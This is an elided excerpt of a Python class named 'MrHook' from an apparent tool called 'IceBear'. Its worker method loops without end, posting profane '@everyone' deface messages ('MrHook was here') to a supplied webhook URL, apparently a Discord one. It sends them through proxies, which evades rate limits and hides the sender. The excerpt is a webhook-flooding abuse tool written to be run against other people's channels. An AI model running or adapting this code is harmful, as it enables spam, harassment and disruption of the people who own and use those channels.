...
class MrHook:
    ...
    def initialize(self):
        os.system('cls && title IceBear - Mr.Hook' if os.name == 'nt' else 'clear')
    ...
    def worker(self, webhook, proxy):
        ...
        while alive:
            try:
                response = requests.post(webhook, headers= {'content-type': 'application/json'}, proxies= {'http': proxy, 'https': proxy}, json= { 'content': '> ||@everyone|| **MrHook was here** | Fucked up by MrHook', 'username': 'Fucked by MrHook' })
